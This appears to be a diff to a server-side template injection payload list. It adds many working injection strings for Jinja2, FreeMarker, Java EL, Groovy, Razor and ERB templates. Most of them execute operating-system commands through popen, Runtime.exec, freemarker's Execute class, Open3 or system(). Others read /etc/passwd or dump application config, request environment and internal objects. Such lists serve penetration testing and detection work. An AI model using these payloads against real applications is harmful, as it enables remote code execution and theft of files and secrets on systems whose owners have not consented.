@@ -1,11 +1,40 @@
-${7*7}
-${"f".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id").getInputStream()}
+#{"freemarker.template.utility.Execute"?new()("id")}
 #{7*7}
+${"f".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id").getInputStream()}
+${"freemarker.template.utility.Execute"?new()("id")}
+${7*7}
+${product.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke(product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
 *{7*7}
-<%= 7*7 %>
-{{7*7}}
-{{config}}
-{{request.application.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+@(1+1)
+@{1+1}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}
+{{ ''.__class__.__mro__[2].__subclasses__()[40].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()") }}
+{{ [].class.parent.subclasses().find { it.name == 'groovy.util.Eval' }?.invokeMethod('me', 'id') }}
+{{ get_flashed_messages.__globals__['current_app'].config }}
 {{ self.__dict__ }}
 {{ self._TemplateReference__context.namespace.clear() }}
+{{''.__class__.__bases__[0].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].popen('id').read()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{7*7}}
+{{7*'7'}}
+{{7*7}}{{7*'7'}}${7*7}
+{{config.items()}}
+{{config}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request.application.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request.environ}}
+{{request}}
+{{self.__dict__}}
+{{self}}
 {{settings}}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+<% require 'open3'; @a,@b,@c=Open3.capture3("id") %>
+<%= 7*7 %>
+<%= system("id") %>
